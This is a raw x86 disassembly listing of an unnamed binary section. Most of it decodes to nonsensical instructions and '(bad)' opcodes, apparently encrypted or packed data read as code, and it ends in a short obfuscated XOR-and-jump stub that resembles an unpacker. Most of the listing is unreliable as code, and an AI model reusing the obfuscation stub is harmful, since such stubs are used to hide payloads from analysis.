  4030b7:	add    BYTE PTR [ebx+0x4d],0xc6
  4030bb:	outs   dx,BYTE PTR ds:[esi]
  4030bc:	mov    ch,0x93
  4030be:	adc    eax,0xd75fbe5e
  4030c3:	or     DWORD PTR [eax+edi*4-0x4],edi
  4030c7:	xchg   ebp,eax
  4030c8:	lods   al,BYTE PTR ds:[esi]
  4030c9:	mov    ds:0xb420fb08,eax
  4030ce:	pushw  ss
  4030d0:	lock repnz xor dh,BYTE PTR [edi]
  4030d4:	js     0x403139
  4030d6:	daa    
  4030d7:	outs   dx,BYTE PTR fs:[esi]
  4030d9:	sbb    edx,DWORD PTR [edx+0x135365c9]
  4030df:	int    0xd6
  4030e1:	dec    esp
  4030e2:	xchg   BYTE PTR [esi+0x6ec77091],ch
  4030e8:	lock xchg esi,eax
  4030ea:	jmp    0x40313b
  4030ec:	push   es
  4030ed:	shl    BYTE PTR [edi],0xe0
  4030f0:	jno    0x40315c
  4030f2:	pop    ebx
  4030f3:	mov    ds:0xe791617e,eax
  4030f8:	ins    DWORD PTR es:[edi],dx
  4030f9:	das    
  4030fa:	cmp    ebx,DWORD PTR [eax+0x3cee38de]
  403100:	fadd   QWORD PTR [edi]
  403102:	sub    eax,0x5b785dca
  403107:	push   ds
  403108:	rol    edi,0x2c
  40310b:	or     BYTE PTR [edx-0x3ceec30f],0xb5
  403112:	mov    BYTE PTR [ebp-0x4b],bl
  403115:	(bad)  
  403116:	fistp  WORD PTR [esi]
  403118:	xchg   esp,eax
  403119:	enter  0xe67,0xe4
  40311d:	cmp    BYTE PTR [edx+0x55b1bc85],dh
  403123:	mov    eax,ds:0xbcd7fa0f
  403128:	(bad)  
  403129:	rcpps  xmm5,XMMWORD PTR [edi-0x65f5e999]
  403130:	jl     0x4030d2
  403132:	es jno 0x4030e3
  403135:	pop    es
  403136:	das    
  403137:	aaa    
  403138:	adc    ch,BYTE PTR [edi]
  40313a:	aas    
  40313b:	push   0x59
  40313d:	loop   0x40310c
  40313f:	xlat   BYTE PTR ds:[ebx]
  403140:	fisubr DWORD PTR [esi]
  403142:	fdiv   QWORD PTR [esp+ecx*1+0x6b]
  403146:	push   0xabc705f2
  40314b:	adc    BYTE PTR [esi-0x43962119],ah
  403151:	cdq    
  403152:	addr16 aam 0x3f
  403155:	loope  0x403173
  403157:	icebp  
  403158:	pop    esi
  403159:	jmp    0x4031da
  40315b:	mov    BYTE PTR [esi],bl
  40315d:	pop    es
  40315e:	adc    al,0xc0
  403160:	mov    edi,0x13e6065
  403165:	adc    edx,0x21
  403168:	aam    0xba
  40316a:	iret   
  40316b:	stos   BYTE PTR es:[edi],al
  40316c:	lods   al,BYTE PTR ds:[esi]
  40316d:	mov    ds:0x1ef05df1,eax
  403172:	xchg   eax,ebx
  403174:	cmp    eax,0x1b2203e2
  403179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317a:	repz sub DWORD PTR [eax],0xfffffffd
  40317e:	xchg   esp,eax
  40317f:	out    dx,eax
  403180:	addr16 push edx
  403182:	xchg   edi,eax
  403183:	mov    ecx,0x3ddd80a9
  403188:	and    BYTE PTR [ebx+0x3a],ch
  40318b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40318c:	jl     0x4031a2
  40318e:	push   DWORD PTR [ecx-0x155f3c92]
  403194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403195:	stc    
  403196:	retf   
  403197:	cmc    
  403198:	jns    0x40314d
  40319a:	lahf   
  40319b:	cmp    BYTE PTR [edi+0x5],dh
  40319e:	imul   ebx,DWORD PTR [edx-0x1a],0x59
  4031a2:	add    DWORD PTR [edx+0x11],edx
  4031a5:	mov    WORD PTR [ecx],?
  4031a7:	jns    0x403207
  4031a9:	inc    edx
  4031aa:	fild   DWORD PTR [ebp+0x66]
  4031ad:	xchg   ecx,eax
  4031af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b0:	sbb    eax,DWORD PTR [edx+0x45993c7e]
  4031b6:	call   0xba79216d
  4031bb:	es xchg ecx,eax
  4031bd:	(bad)  
  4031bf:	mov    ds,WORD PTR [ebp+0x61]
  4031c2:	mov    esp,0x22c59d99
  4031c7:	xor    eax,0xee08b54c
  4031cc:	inc    esi
  4031cd:	retf   0xd36f
  4031d0:	mov    bl,0xa7
  4031d2:	jmp    0xf151:0x41112dc4
  4031d9:	or     ah,cl
  4031db:	ins    DWORD PTR es:[edi],dx
  4031dc:	xlat   BYTE PTR ds:[ebx]
  4031dd:	sbb    esi,ebp
  4031df:	push   ds
  4031e0:	lds    ebx,FWORD PTR [edx+0x55]
  4031e3:	lahf   
  4031e4:	imul   edi,DWORD PTR [ebx+ebp*8+0x21],0xa7c03666
  4031ec:	in     al,0x4a
  4031ee:	hlt    
  4031ef:	mov    dh,0xeb
  4031f1:	mov    al,BYTE PTR [edx-0x43095d65]
  4031f7:	pop    eax
  4031f8:	gs stc 
  4031fa:	mov    esp,0xbdc4f8cc
  4031ff:	(bad)  
  403200:	ss jnp 0x403245
  403203:	jmp    0xdef8:0x66de3f16
  40320a:	ins    DWORD PTR es:[edi],dx
  40320b:	adc    eax,0x7759a0c7
  403210:	adc    esp,DWORD PTR [ebx+0x49]
  403213:	pop    es
  403214:	aaa    
  403215:	push   0x63
  403217:	iret   
  403218:	neg    ch
  40321a:	pop    eax
  40321b:	cmp    eax,0x2cfeea11
  403220:	outs   dx,DWORD PTR ds:[esi]
  403221:	scas   al,BYTE PTR es:[edi]
  403222:	mov    BYTE PTR [ebx],bl
  403224:	push   0x14e48f92
  403229:	pusha  
  40322a:	dec    ecx
  40322b:	push   ebx
  40322c:	mov    eax,0x9403574e
  403231:	add    dh,BYTE PTR [ebp+0x43a10c68]
  403237:	inc    ecx
  403238:	sub    ebx,esp
  40323a:	in     al,dx
  40323b:	jmp    0x86e6c90
  403240:	out    0x30,al
  403242:	and    dl,bh
  403244:	ret    
  403245:	sub    BYTE PTR [ecx],bl
  403247:	cmp    dl,BYTE PTR [eax+eiz*4-0x5d3d6587]
  40324e:	(bad)  
  40324f:	or     eax,0xeebc7c0b
  403254:	add    al,0x8b
  403256:	test   BYTE PTR [edx+0x26e26f3c],0x81
  40325d:	xchg   esi,eax
  40325e:	xchg   esi,eax
  40325f:	retf   
  403260:	enter  0xd440,0xae
  403264:	dec    eax
  403265:	adc    esi,DWORD PTR [eax]
  403267:	in     eax,0xc3
  403269:	cmp    DWORD PTR [ebx],esi
  40326b:	sar    BYTE PTR [ebx+0x4b],1
  40326e:	cmp    BYTE PTR [esi-0x1e3bbf5d],bl
  403274:	and    eax,0xd531d78b
  403279:	outs   dx,DWORD PTR ds:[esi]
  40327a:	cli    
  40327b:	stos   BYTE PTR es:[edi],al
  40327c:	dec    esp
  40327d:	scas   al,BYTE PTR es:[edi]
  40327e:	mov    ds:0xf43b7932,al
  403283:	test   DWORD PTR [ecx+0x10],esp
  403286:	test   edi,edx
  403288:	test   BYTE PTR [eax-0x18672353],bl
  40328e:	xchg   edx,eax
  40328f:	les    edi,FWORD PTR [esp+0x3b40a7cb]
  403296:	pop    ecx
  403297:	jmp    0x8fd0376
  40329c:	add    BYTE PTR [ecx-0x2],dh
  40329f:	cdq    
  4032a0:	xor    BYTE PTR [esi+0x4a49b983],dh
  4032a6:	shr    BYTE PTR [eax+0x1bfa9ec7],1
  4032ac:	jp     0x4032b1
  4032ae:	fisubr WORD PTR [ebx-0x58977aa3]
  4032b4:	xchg   ebp,eax
  4032b5:	sbb    BYTE PTR [eax-0x1b],0x76
  4032b9:	out    0x18,eax
  4032bb:	push   esp
  4032bc:	or     dh,bh
  4032be:	shl    al,0xb4
  4032c1:	mov    ecx,0x147aca20
  4032c6:	jg     0x403340
  4032c8:	push   cs
  4032c9:	jne    0x4032c7
  4032cb:	jno    0x403309
  4032cd:	fsubr  DWORD PTR [ebx+ecx*2+0x26]
  4032d1:	je     0x403329
  4032d3:	pop    ds
  4032d4:	dec    ebp
  4032d5:	add    eax,0x56288e69
  4032da:	cli    
  4032db:	cwde   
  4032dc:	dec    edx
  4032dd:	xchg   edx,eax
  4032de:	pop    esp
  4032df:	ds fdiv st(2),st
  4032e2:	dec    ecx
  4032e3:	push   ecx
  4032e4:	xchg   edi,eax
  4032e5:	out    0x72,eax
  4032e7:	xor    DWORD PTR [edx],esp
  4032e9:	(bad)  
  4032ea:	jbe    0x40330f
  4032ec:	nop
  4032ed:	xor    DWORD PTR [eax+0x5d0a767a],edx
  4032f3:	retf   
  4032f4:	outs   dx,DWORD PTR ds:[esi]
  4032f5:	iret   
  4032f6:	popf   
  4032f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f8:	xchg   esi,eax
  4032f9:	repz cli 
  4032fb:	push   0x1d
  4032fd:	jbe    0x4032b6
  4032ff:	or     eax,0xc96b66dd
  403304:	(bad)  
  403305:	(bad)  
  403307:	dec    ebp
  403308:	ins    DWORD PTR es:[edi],dx
  403309:	adc    al,BYTE PTR [ebx+0x1bd2703e]
  40330f:	adc    ecx,DWORD PTR [esp+edi*4-0x4708003e]
  403316:	mov    dh,0x38
  403318:	lods   al,BYTE PTR ds:[esi]
  403319:	ror    BYTE PTR [edx-0x6],0xca
  40331d:	in     al,dx
  40331e:	xchg   esi,eax
  40331f:	call   0xa49b:0xaf4e66cd
  403326:	fld    DWORD PTR [edx-0x2219ecdb]
  40332c:	mov    dh,0xa0
  40332e:	in     eax,0xfa
  403330:	cmp    ebp,esp
  403332:	push   ds
  403333:	fwait
  403334:	(bad)  
  403335:	(bad)  [ebx-0x5d]
  403338:	adc    BYTE PTR [esi-0x2e],0xd8
  40333c:	sbb    DWORD PTR [ebp+0x39],ebx
  40333f:	(bad)  
  403340:	js     0x4032df
  403342:	dec    edx
  403343:	shl    dh,cl
  403345:	test   DWORD PTR [esi+0x4],ecx
  403348:	xchg   esp,eax
  403349:	jno    0x403385
  40334b:	gs in  al,0x79
  40334e:	push   ds
  40334f:	inc    edi
  403350:	add    edi,DWORD PTR [ecx-0x7e7f107c]
  403356:	scas   eax,DWORD PTR es:[edi]
  403357:	sbb    edx,DWORD PTR [eax+0x1dd23324]
  40335d:	jbe    0x4033a3
  40335f:	mov    al,0xde
  403361:	jnp    0x4033c1
  403363:	mov    al,0x20
  403365:	lods   eax,DWORD PTR ds:[esi]
  403366:	nop
  403367:	int    0xd4
  403369:	jl     0x40337d
  40336b:	adc    DWORD PTR [eax-0x4a420530],ebp
  403371:	jge    0x40339b
  403373:	retf   
  403374:	arpl   WORD PTR [ebx-0x7d86e27a],ax
  40337a:	jmp    0xcf1496aa
  40337f:	stos   DWORD PTR es:[edi],eax
  403380:	stc    
  403381:	shl    DWORD PTR [ecx-0x1],1
  403384:	test   BYTE PTR [esi-0x32],ah
  403387:	xchg   edx,eax
  403388:	out    dx,eax
  403389:	gs repnz out dx,eax
  40338c:	lods   al,BYTE PTR ds:[esi]
  40338d:	aam    0x76
  40338f:	and    DWORD PTR [ebx-0x200a4738],ebp
  403395:	das    
  403396:	push   ecx
  403397:	inc    ebp
  403398:	sbb    edx,DWORD PTR [ebx+eax*4-0x6f]
  40339c:	lods   al,BYTE PTR ds:[esi]
  40339d:	enter  0x8aa9,0xe6
  4033a1:	mov    esp,DWORD PTR [ebx+0x30]
  4033a4:	xchg   ebp,eax
  4033a5:	es js  0x4033f3
  4033a8:	stc    
  4033a9:	pop    edx
  4033aa:	push   eax
  4033ab:	repz ja 0x4033c0
  4033ae:	(bad)  
  4033b0:	(bad)  
  4033b1:	sete   cl
  4033b4:	retf   
  4033b5:	cmovno edi,DWORD PTR [esi+0x59a8ca0b]
  4033bc:	jl     0x4033fd
  4033be:	inc    eax
  4033bf:	jl     0x4033d7
  4033c1:	cli    
  4033c2:	push   ds
  4033c3:	adc    ecx,DWORD PTR [edx]
  4033c5:	mov    edi,ebx
  4033c7:	sbb    DWORD PTR [edi],eax
  4033c9:	or     eax,0xffffff8b
  4033cc:	nop
  4033cd:	lods   al,BYTE PTR fs:[esi]
  4033cf:	mov    ds:0x1aa953c2,eax
  4033d4:	cwde   
  4033d5:	retf   0xae6b
  4033d8:	in     eax,0x7e
  4033da:	and    eax,0xb760951d
  4033df:	cmp    al,0xaf
  4033e1:	jo     0x40343e
  4033e3:	addr16 pop ss
  4033e5:	adc    ebx,DWORD PTR [ebx+0x2e]
  4033e8:	pop    ecx
  4033e9:	dec    esi
  4033ea:	sub    DWORD PTR [esi+0x55],esi
  4033ed:	xor    BYTE PTR [esp+ebp*2],ch
  4033f0:	fmul   DWORD PTR [ecx]
  4033f2:	fmul   DWORD PTR [eax]
  4033f4:	scas   eax,DWORD PTR es:[edi]
  4033f5:	mov    eax,ds:0x8ea07032
  4033fa:	and    ecx,DWORD PTR [ecx+0x5]
  4033fd:	pusha  
  4033fe:	push   esi
  4033ff:	xchg   bh,bl
  403401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403402:	jg     0x403432
  403404:	stos   DWORD PTR es:[edi],eax
  403405:	cmp    al,0xb6
  403407:	adc    al,0xa2
  403409:	aad    0x1
  40340b:	push   esi
  40340c:	xor    ebx,DWORD PTR [ebx+0x29351521]
  403412:	imul   ecx,DWORD PTR [ebp+0x87d8bf2],0x40ba3f8b
  40341c:	mov    al,BYTE PTR [eax]
  40341e:	add    BYTE PTR [esi+0x33],ah
  403421:	ret    0xace9
  403424:	add    eax,DWORD PTR [eax]
  403426:	add    BYTE PTR [eax-0x26e2267],dl
  40342c:	push   ebp
  40342d:	jl     0x4033c8
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	dec    esp
  403434:	xor    edx,edx
  403436:	and    esp,DWORD PTR [edx]
  403438:	push   ds
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	xchg   ecx,eax
  403440:	xor    eax,0x54d878b4
  403445:	dec    ebx
  403446:	outs   dx,BYTE PTR ds:[esi]
  403447:	sahf   
  403448:	outs   dx,BYTE PTR ds:[esi]
  403449:	sub    edx,DWORD PTR [ebp+0x7f]
  40344c:	mov    esp,0xe9febeb2
  403451:	pusha  
  403452:	xor    eax,0x5d16b5e
  403457:	pop    es
  403458:	xchg   ecx,eax
  403459:	iret   
  40345a:	loop   0x4033f3
  40345c:	adc    BYTE PTR [esi+0x2d],ch
  40345f:	gs pop esp
  403461:	jp     0x40343e
  403463:	in     eax,dx
  403464:	fidivr DWORD PTR [ecx*2+0x5ae4039a]
  40346b:	or     esi,DWORD PTR [esi-0x67]
  40346e:	mov    dh,0x3a
  403470:	imul   esp,DWORD PTR [ebp-0x68],0xe
  403474:	aaa    
  403475:	mov    ds,ebx
  403477:	lods   al,BYTE PTR ds:[esi]
  403478:	ja     0x4034dd
  40347a:	mov    ah,0x4b
  40347c:	sbb    eax,0x35b3088e
  403481:	aad    0xd7
  403483:	push   DWORD PTR [ebx+0xbe1f2a0]
  403489:	popa   
  40348a:	rol    DWORD PTR [edi+0x2d3f508a],cl
  403490:	mov    edx,0x7bf6d027
  403495:	xor    cl,BYTE PTR [edx]
  403497:	test   bl,bl
  403499:	xchg   ebp,eax
  40349a:	outs   dx,DWORD PTR ds:[esi]
  40349b:	cdq    
  40349c:	sbb    BYTE PTR [esi],dl
  40349e:	lock mov edx,0xa1e6fe2a
  4034a4:	xor    dh,dl
  4034a6:	lahf   
  4034a7:	neg    DWORD PTR [edx]
  4034a9:	int    0x15
  4034ab:	cs adc dh,dl
  4034ae:	shl    BYTE PTR [ebx-0x74],1
  4034b1:	stos   BYTE PTR es:[edi],al
  4034b2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4034b4:	cmp    BYTE PTR [esp+eax*4-0xa736886],ah
  4034bb:	das    
  4034bc:	sbb    BYTE PTR [edx-0x77],dl
  4034bf:	add    esp,DWORD PTR [ebx-0xb]
  4034c2:	and    bl,al
  4034c4:	xchg   ebx,eax
  4034c5:	sbb    BYTE PTR [esi],dl
  4034c7:	xor    al,0xc2
  4034c9:	outs   dx,BYTE PTR ds:[esi]
  4034ca:	jmp    0x38d5:0xa403b62b
  4034d1:	stos   DWORD PTR es:[edi],eax
  4034d2:	mov    eax,ds:0xe95d2e4c
  4034d7:	ficom  DWORD PTR [edi]
  4034d9:	jge    0x40350b
  4034db:	pop    ecx
  4034dc:	lea    eax,[eax-0x17]
  4034df:	inc    eax
  4034e0:	dec    ebp
  4034e1:	or     al,0x56
  4034e3:	jnp    0x4034fa
  4034e5:	cbw    
  4034e7:	pop    es
  4034e8:	ins    BYTE PTR es:[edi],dx
  4034e9:	adc    edi,DWORD PTR [edi+0x22b73dfc]
  4034ef:	gs mov ebx,0x604fc386
  4034f5:	push   edx
  4034f6:	(bad)  
  4034f8:	ret    
  4034f9:	aad    0xe2
  4034fb:	dec    edx
  4034fc:	mov    WORD PTR [ecx+0x1c],cs
  4034ff:	js     0x4034c7
  403501:	gs pusha 
  403503:	inc    ebp
  403504:	mov    ch,0xe1
  403506:	add    BYTE PTR [edi+eiz*1+0x5e4d2a1e],ch
  40350d:	movlps QWORD PTR [edx],xmm6
  403510:	scas   eax,DWORD PTR es:[edi]
  403511:	mov    esi,0xe3fb9aba
  403516:	jo     0x4034be
  403518:	(bad)  
  403519:	mov    bl,0x21
  40351b:	in     eax,dx
  40351c:	popa   
  40351d:	jl     0x403502
  40351f:	imul   edx
  403521:	clc    
  403522:	dec    ebp
  403523:	cmc    
  403524:	inc    esp
  403525:	pop    ds
  403526:	adc    al,0x29
  403528:	xchg   ecx,eax
  403529:	jno    0x403543
  40352b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352c:	and    al,0x88
  40352e:	into   
  40352f:	aad    0x55
  403531:	(bad)  
  403532:	xchg   esp,eax
  403533:	inc    esp
  403534:	add    al,0x36
  403536:	mov    edx,0xd1bf5ac6
  40353b:	ret    0xccb4
  40353e:	or     BYTE PTR [edx-0x253d3f41],bl
  403544:	mov    eax,ds:0x5e511ee2
  403549:	inc    edx
  40354a:	outs   dx,DWORD PTR ds:[esi]
  40354b:	pop    ss
  40354c:	mov    ch,0x9e
  40354e:	loope  0x4035bb
  403550:	or     ch,BYTE PTR [ecx]
  403552:	inc    edi
  403553:	data16 cs (bad) 
  403556:	jnp    0x4035ad
  403558:	jecxz  0x403590
  40355a:	fdiv   DWORD PTR [ecx-0x33]
  40355d:	xchg   esp,eax
  40355e:	xchg   ecx,eax
  40355f:	push   eax
  403560:	sbb    edi,DWORD PTR [edx]
  403562:	dec    edi
  403563:	rcr    edx,0xb0
  403566:	int    0x40
  403568:	jge    0x403579
  40356a:	and    edi,edi
  40356c:	jmp    0xd176:0x8603fff9
  403573:	jecxz  0x4035c9
  403575:	pop    ss
  403576:	test   eax,0xe29e6c80
  40357b:	popa   
  40357c:	sbb    al,0x62
  40357e:	ds mov ebp,0x33674444
  403584:	adc    ecx,DWORD PTR [edi+0x21]
  403587:	cmp    DWORD PTR cs:[ebp-0xc92ba55],eax
  40358e:	ss xchg esi,eax
  403590:	inc    ecx
  403591:	popa   
  403592:	mov    cl,0x9f
  403594:	test   BYTE PTR [eax+0x37],cl
  403597:	lock push esi
  403599:	cmp    BYTE PTR [eax-0x50],bl
  40359c:	adc    edx,DWORD PTR [ebx+0x67ee594b]
  4035a2:	sbb    al,0x6c
  4035a4:	sub    eax,eax
  4035a6:	fisubr DWORD PTR [ebx+edi*8-0x49]
  4035aa:	(bad)  
  4035ab:	out    dx,eax
  4035ac:	sbb    esi,DWORD PTR [esi-0x6b5601b0]
  4035b2:	fs cli 
  4035b4:	xchg   ecx,eax
  4035b5:	and    esp,DWORD PTR [ebp+0x52a2c606]
  4035bb:	xor    al,0xf8
  4035bd:	ja     0x403627
  4035bf:	pusha  
  4035c0:	ins    DWORD PTR es:[edi],dx
  4035c1:	mov    ch,0x56
  4035c3:	sub    DWORD PTR [edi*4+0x78741fd7],ebp
  4035ca:	xor    edi,esi
  4035cc:	ss mov ebx,0x32ddaafd
  4035d2:	inc    ebx
  4035d3:	cmp    DWORD PTR [esi-0x4b],edx
  4035d6:	loop   0x4035d3
  4035d8:	sbb    DWORD PTR [edi+0x2fb6400e],0xb0d55b9c
  4035e2:	pop    ss
  4035e3:	jno    0x4035b4
  4035e5:	or     al,0x80
  4035e7:	push   edx
  4035e8:	and    al,0x1b
  4035ea:	adc    esp,DWORD PTR [ecx+0x14db6762]
  4035f0:	pop    ebx
  4035f1:	sti    
  4035f2:	sub    eax,0x6821f291
  4035f7:	test   al,0x49
  4035f9:	sub    BYTE PTR ds:0x84c6e6aa,bl
  4035ff:	(bad)  
  403600:	jge    0x403588
  403602:	adc    BYTE PTR [ecx-0x180129ec],bh
  403608:	fidiv  DWORD PTR [esi+0x8518552]
  40360e:	sbb    DWORD PTR [ecx],ecx
  403610:	call   0xdc2f936b
  403615:	retf   
  403616:	aam    0xc2
  403618:	retf   0x7acd
  40361b:	add    dh,BYTE PTR [ebx-0x6334a174]
  403621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403622:	fmul   QWORD PTR [eax-0x3f626a0b]
  403628:	mov    bh,0xb3
  40362a:	mov    edi,0x75b78a4b
  40362f:	pop    ds
  403630:	push   edx
  403631:	jno    0x4035be
  403633:	stc    
  403634:	mov    BYTE PTR [ecx-0x5c],bl
  403637:	mov    ah,0xbc
  403639:	out    0xd8,eax
  40363b:	lea    esp,[eax]
  40363d:	jg     0x403610
  40363f:	pop    ds
  403640:	call   0x11054cad
  403645:	in     eax,dx
  403646:	jns    0x403694
  403648:	fwait
  403649:	cli    
  40364a:	jge    0x4036ae
  40364c:	into   
  40364d:	xor    DWORD PTR [esi],esp
  40364f:	jecxz  0x403622
  403651:	cmp    ebp,edi
  403653:	pop    ebx
  403654:	loopne 0x403691
  403656:	sub    edi,ecx
  403658:	imul   DWORD PTR [ecx+0x21f3f08b]
  40365e:	les    ecx,FWORD PTR [edi-0x55]
  403661:	addr16 xchg ebp,eax
  403663:	xor    esp,ebx
  403665:	sahf   
  403666:	jl     0x40363e
  403668:	add    DWORD PTR [edi+0x3f],ebx
  40366b:	adc    BYTE PTR [eax],dh
  40366d:	stos   BYTE PTR es:[edi],al
  40366e:	gs aam 0xf1
  403671:	jb     0x40365f
  403673:	cmp    edx,DWORD PTR ds:0x150a3803
  403679:	dec    esi
  40367a:	sub    BYTE PTR [ebx-0x17],dh
  40367d:	(bad)  
  40367e:	call   0xe48cd592
  403683:	sahf   
  403684:	jle    0x4036ea
  403686:	repz (bad) 
  403688:	dec    ecx
  403689:	dec    ecx
  40368a:	rcl    DWORD PTR [edi],1
  40368c:	shl    BYTE PTR [eax+0x43],cl
  40368f:	push   cs
  403690:	aas    
  403691:	out    dx,al
  403692:	dec    ebp
  403693:	inc    ecx
  403694:	jno    0x4036ed
  403696:	ja     0x4036a3
  403698:	sub    eax,0x74a85a96
  40369d:	jle    0x403715
  40369f:	mov    cl,0x81
  4036a1:	in     eax,dx
  4036a2:	cmp    eax,0x96737357
  4036a7:	test   eax,0x5553ae75
  4036ac:	js     0x40363d
  4036ae:	cmp    cl,BYTE PTR [eax]
  4036b0:	mov    al,0xdc
  4036b2:	xchg   ecx,eax
  4036b3:	rol    dh,cl
  4036b5:	imul   eax,DWORD PTR [esi-0x6],0xe318d56e
  4036bc:	shl    DWORD PTR [edi+esi*8+0x5c137c2b],cl
  4036c3:	or     ecx,DWORD PTR [ebx+0x20619336]
  4036c9:	daa    
  4036ca:	xchg   edi,eax
  4036cb:	xchg   edx,eax
  4036cc:	into   
  4036cd:	sbb    BYTE PTR [eax-0x74005ee8],dh
  4036d3:	fistp  WORD PTR [edx]
  4036d5:	sbb    BYTE PTR [ebx+0x53],0xf9
  4036d9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4036db:	cli    
  4036dc:	div    BYTE PTR [ebx+0x4b]
  4036df:	js     0x40369d
  4036e1:	leave  
  4036e2:	call   0xcd56:0x6149dfc1
  4036e9:	push   esi
  4036ea:	stc    
  4036eb:	test   al,0x45
  4036ed:	cmp    ecx,DWORD PTR fs:[ebx+ebx*8+0x27]
  4036f2:	fmul   DWORD PTR fs:[ecx+0x54]
  4036f6:	aam    0x95
  4036f8:	add    dh,BYTE PTR [edx-0x22]
  4036fb:	bound  ebx,QWORD PTR [eax-0x75]
  4036fe:	push   es
  4036ff:	adc    eax,edi
  403701:	xchg   dh,ah
  403703:	add    DWORD PTR [edx-0x76],ecx
  403706:	cwde   
  403707:	cmp    BYTE PTR [esp],ah
  40370a:	jb     0x403781
  40370c:	cmc    
  40370d:	dec    esp
  40370e:	jbe    0x40372a
  403710:	cdq    
  403711:	cwde   
  403712:	add    DWORD PTR [ecx-0x6b],ecx
  403715:	lock cmp dl,BYTE PTR [eax+0x4c]
  403719:	fwait
  40371a:	xor    al,0xf0
  40371c:	in     al,dx
  40371d:	xor    BYTE PTR [ecx+0x4a4bbcb6],ah
  403723:	jle    0x40376a
  403725:	jle    0x4036cb
  403727:	int3   
  403728:	inc    edx
  403729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40372a:	call   0x83f5:0xfff0f315
  403731:	pop    es
  403732:	sbb    ebx,DWORD PTR [eax]
  403734:	cmp    al,0xe0
  403736:	jge    0x40373d
  403738:	sbb    BYTE PTR [ecx],dl
  40373a:	xor    BYTE PTR [eax-0x1cc93889],0x51
  403741:	push   esi
  403742:	pop    edi
  403743:	sbb    al,0x47
  403745:	and    bl,BYTE PTR [esi+eax*4]
  403748:	aaa    
  403749:	sub    al,0xae
  40374b:	jns    0x403797
  40374d:	cld    
  40374e:	mov    BYTE PTR [edx],dh
  403750:	jg     0x403775
  403752:	xchg   edx,eax
  403753:	cdq    
  403754:	xor    ah,BYTE PTR [ecx+0x5d865d60]
  40375a:	cmc    
  40375b:	xchg   BYTE PTR [esi-0x5166cb44],dh
  403761:	imul   esi,DWORD PTR [esi-0x561e96ef],0xb205edeb
  40376b:	cld    
  40376c:	clc    
  40376d:	inc    ebp
  40376e:	nop
  40376f:	(bad)  
  403770:	nop
  403771:	push   edx
  403772:	mov    ah,0x71
  403774:	fistp  WORD PTR [eax]
  403776:	addr16 xchg edi,eax
  403778:	aaa    
  403779:	sub    edi,DWORD PTR [eax+0x12137c0]
  40377f:	and    esi,edi
  403781:	hlt    
  403782:	mov    esp,0xdd724338
  403787:	mov    esp,0xf6af706c
  40378c:	adc    eax,0xed755850
  403791:	cmp    eax,0xd49f5435
  403796:	(bad)  
  403797:	adc    al,0x5f
  403799:	test   al,0x96
  40379b:	adc    al,0xc4
  40379d:	jnp    0x4037b4
  40379f:	or     eax,0x6a42dbb8
  4037a4:	xor    dh,BYTE PTR fs:[edi+0x39]
  4037a8:	clc    
  4037a9:	pop    esi
  4037aa:	mov    ebx,0xb925818c
  4037af:	ja     0x4037c1
  4037b1:	aad    0xbb
  4037b3:	out    0x97,al
  4037b5:	sbb    edi,DWORD PTR gs:[esi+0x1e]
  4037b9:	stc    
  4037ba:	faddp  st(6),st
  4037bc:	jmp    0x6f10d83b
  4037c1:	xchg   esp,eax
  4037c2:	ret    
  4037c3:	ins    DWORD PTR es:[edi],dx
  4037c4:	or     DWORD PTR [edi],ecx
  4037c6:	push   esi
  4037c7:	inc    ecx
  4037c8:	aaa    
  4037c9:	imul   ebp,esp,0x82d5e54c
  4037cf:	mov    al,0x78
  4037d1:	add    al,0xdb
  4037d3:	mov    edx,0x3b06
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4305a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e866,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e866
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e866,ecx
